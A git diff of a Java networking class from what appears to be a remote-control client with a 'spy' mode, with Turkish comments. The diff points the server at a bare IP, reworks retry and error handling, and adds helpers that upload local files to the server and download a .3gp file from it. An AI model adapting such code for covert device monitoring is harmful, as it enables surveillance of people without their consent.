@@ -17,9 +17,9 @@ import org.apache.http.params.CoreProtocolPNames;
 import org.apache.http.params.HttpParams;
 import org.apache.http.util.EntityUtils;
 
-import java.io.File;
-import java.io.IOException;
+import java.io.*;
 import java.net.MalformedURLException;
+import java.net.URI;
 import java.net.URISyntaxException;
 import java.net.URL;
 import java.util.ArrayList;
@@ -30,7 +30,7 @@ import java.util.Random;
  * Server isteklerini yapma için oluşturulmuştur.
  */
 public class server_requests {
-    private static String server_url="http://app.coretekno.com/full_control/web_service/";
+    private static String server_url="http://46.101.231.241/";
     private static String client_token;
     private static String connect_id;
     private static String mode = "spy";
@@ -55,13 +55,13 @@ public class server_requests {
             HttpEntity entity = response.getEntity();
             client_token = EntityUtils.toString(entity, "UTF-8");
             if(client_token.equals("hata")){
-                if(status==1){ exception_messages.show_message(Set_strings.get_value("hata"),Set_strings.get_value("config_xml_hatasi"));status++;}
+                if(status==0){ exception_messages.show_message(Set_strings.get_value("hata"),Set_strings.get_value("config_xml_hatasi"));status++;}
                 Thread.sleep(5000);
                 new server_requests();
             }
         }
         catch (Exception e){
-            if(status==1){exception_messages.show_message(Set_strings.get_value("hata"), Set_strings.get_value("internet_yok"));status++;}
+            if(status==0 || status == 1){exception_messages.show_message(Set_strings.get_value("hata"), Set_strings.get_value("internet_yok"));status++;}
             Thread.sleep(5000);
             new server_requests();
         }
@@ -95,8 +95,9 @@ public class server_requests {
             server_versiyon = Integer.parseInt(EntityUtils.toString(entity, "UTF-8"));
         }
         catch (Exception e){
-            if(status==1){exception_messages.show_message(Set_strings.get_value("hata"), Set_strings.get_value("internet_yok"));status++;}
+            if(status%5==0){exception_messages.show_message(Set_strings.get_value("hata"), Set_strings.get_value("internet_yok"));status++;}
             Thread.sleep(5000);
+            status++;
             server_versiyon();
         }
         httpclient.getConnectionManager().shutdown();
@@ -117,10 +118,9 @@ public class server_requests {
                 new server_requests();
             }
         } catch (Exception e) {
-            if(status == 1){exception_messages.show_message(Set_strings.get_value("hata"), Set_strings.get_value("internet_yok"));status++;}
+            if(status == 2){exception_messages.show_message(Set_strings.get_value("hata"), Set_strings.get_value("internet_yok"));status++;}
             e.printStackTrace();
-            Thread.sleep(5000);
-            http_get_request(php_file_name, request);
+            answer = "0";
         }
         httpclient.getConnectionManager().shutdown();
         return answer;
@@ -131,7 +131,7 @@ public class server_requests {
         String respond;
 
         HttpResponse response;
-        HttpClient myClient = new DefaultHttpClient();
+        HttpClient myClient = getThreadSafeClient();
         HttpPost myConnection;
         myConnection = new HttpPost(String.valueOf(url));
         List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(requests.length);
@@ -143,14 +143,24 @@ public class server_requests {
         response = myClient.execute(myConnection);
         respond = EntityUtils.toString(response.getEntity(), "UTF-8");
 
+        myClient.getConnectionManager().shutdown();
         return respond;
     }
     public static void upload_file_to_server(String file_dir,String file_type,String file_extension) throws IOException, HttpException, URISyntaxException {
+        File file = new File(file_dir);
+        upload_file_server(file,file_type,file_extension);
+
+    }
+    public static void upload_file_to_server(URL file_dir, String file_type, String file_extension) throws IOException, HttpException, URISyntaxException {
+        File file = new File(file_dir.toURI());
+        upload_file_server(file,file_type,file_extension);
+
+    }
+    private static void upload_file_server(File file,String file_type,String file_extension) throws IOException, HttpException, URISyntaxException {
         HttpClient httpclient = getThreadSafeClient();
         reading_class read_xml = new reading_class();
         httpclient.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
         HttpPost httppost = new HttpPost(server_url+"upload.php?file_name="+read_xml.get_connect_id()+file_extension+"&client_token="+client_token+"&computer_id="+read_xml.get_computer_id());
-        File file = new File(file_dir);
         MultipartEntity mpEntity = new MultipartEntity(HttpMultipartMode.BROWSER_COMPATIBLE);
         ContentBody cbFile = new FileBody(file, file_type);
         mpEntity.addPart("userfile", cbFile);
@@ -159,6 +169,27 @@ public class server_requests {
         response = httpclient.execute(httppost);
         httpclient.getConnectionManager().shutdown();
 
+    }
+
+    public static void download_3gp(String filedir) throws IOException {
+
+        URL link = new URL(server_url+"user_files/"+connect_id+".3gp");
+
+        InputStream in = new BufferedInputStream(link.openStream());
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        byte[] buf = new byte[1024];
+        int n = 0;
+        while (-1!=(n=in.read(buf)))
+        {
+            out.write(buf, 0, n);
+        }
+        out.close();
+        in.close();
+        byte[] response = out.toByteArray();
+
+        FileOutputStream fos = new FileOutputStream(filedir);
+        fos.write(response);
+        fos.close();
     }
 
 
